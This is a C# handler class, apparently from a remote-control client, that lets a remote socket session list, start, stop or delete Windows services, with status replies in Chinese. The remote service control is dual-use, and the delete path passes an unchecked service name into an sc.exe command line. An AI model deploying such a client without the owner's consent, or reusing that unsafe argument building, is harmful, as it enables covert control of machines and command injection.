using System;
using System.Collections.Generic;
using System.ServiceProcess;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestServiceManagerHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestServiceManager;
                    if (req == null) return;

                    switch (req.Action)
                    {
                        case eServiceAction.List:
                            SendServiceList(session);
                            break;
                        case eServiceAction.Start:
                            StartService(session, req.ServiceName);
                            break;
                        case eServiceAction.Stop:
                            StopService(session, req.ServiceName);
                            break;
                        case eServiceAction.Delete:
                            DeleteService(session, req.ServiceName);
                            break;
                    }
                }
                catch (Exception ex)
                {
                    SendMessage(session, false, ex.Message);
                }
            });
        }

        private void SendServiceList(SocketSession session)
        {
            var services = ServiceController.GetServices();
            var list = new List<ServiceInfo>();
            foreach (var svc in services)
            {
                using (svc)
                {
                    list.Add(new ServiceInfo
                    {
                        ServiceName = svc.ServiceName,
                        DisplayName = svc.DisplayName,
                        Status = svc.Status.ToString(),
                        StartType = string.Empty
                    });
                }
            }

            var resp = new ResponseServiceManager();
            resp.Result = true;
            resp.Services = list;
            session.Send(ePacketType.PACKET_SERVICE_MANAGER_RESPONSE, resp);
        }

        private void StartService(SocketSession session, string serviceName)
        {
            using (var sc = new ServiceController(serviceName))
            {
                if (sc.Status != ServiceControllerStatus.Running)
                {
                    sc.Start();
                    sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
                }
            }
            SendMessage(session, true, "服务 " + serviceName + " 已启动");
        }

        private void StopService(SocketSession session, string serviceName)
        {
            using (var sc = new ServiceController(serviceName))
            {
                if (sc.Status != ServiceControllerStatus.Stopped)
                {
                    sc.Stop();
                    sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(10));
                }
            }
            SendMessage(session, true, "服务 " + serviceName + " 已停止");
        }

        private void DeleteService(SocketSession session, string serviceName)
        {
            RemoteControl.Protocals.Utilities.ProcessUtil.Run("sc.exe", "delete \"" + serviceName + "\"", true).Join();
            SendMessage(session, true, "服务 " + serviceName + " 已删除");
        }

        private void SendMessage(SocketSession session, bool result, string message)
        {
            var resp = new ResponseServiceManager();
            resp.Result = result;
            resp.Message = message;
            session.Send(ePacketType.PACKET_SERVICE_MANAGER_RESPONSE, resp);
        }
    }
}
